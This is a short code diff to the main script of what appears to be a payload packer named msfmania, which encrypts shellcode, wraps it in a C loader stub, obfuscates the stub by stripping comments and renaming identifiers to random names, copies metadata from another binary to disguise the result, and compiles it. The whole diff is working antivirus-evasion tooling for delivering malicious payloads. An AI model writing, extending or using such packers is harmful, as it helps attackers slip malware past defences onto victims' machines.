@@ -1,4 +1,4 @@
-from msfmania import compiler, core, encryption, evasion, builder, utils
+from msfmania import compiler, core, encryption, obfuscator, builder, utils
 import argparse 
 
 if __name__ == '__main__':
@@ -16,12 +16,29 @@ if __name__ == '__main__':
     payload = open(args.payload, "rb").read()
     encrypted_shellcode, payload_hash, salt = encryption.shellcode_encryption(payload, args.keysize)
     
-    builder.create_stub(encrypted_shellcode, payload_hash, salt, args.keysize)
-    evasion.obfuscate_c_file("/tmp/main.c")
+    stub_path = "/tmp/main.c"
+    builder.create_stub(stub_path, encrypted_shellcode, payload_hash, salt, args.keysize)
+    
+    obfuscator.remove_comments_from_file(stub_path)
+    # obfuscator.remove_console_outputs_from_file(stub_path)
+    
+    # Rename user-defined identifiers
+    with open(stub_path, 'r') as f:
+        content = f.read()
+    
+    # Find user-defined functions and variables
+    user_functions = obfuscator.find_user_defined_functions(content)
+    user_variables = obfuscator.find_user_defined_variables(content)
+    all_identifiers = user_functions.union(user_variables)
+    
+    # Generate random mappings and rename
+    if all_identifiers:
+        mappings = obfuscator.generate_random_mappings(all_identifiers)
+        obfuscator.rename_identifiers_in_file(stub_path, mappings)
     
     resource_info = None
     if args.spoof_bin:
         resource_info = utils.extract_binary_metadata(args.spoof_bin)
     
-    compiler.compile(output_path, args.strip, resource_info)
+    compiler.compile(stub_path, output_path, args.strip, resource_info)
     
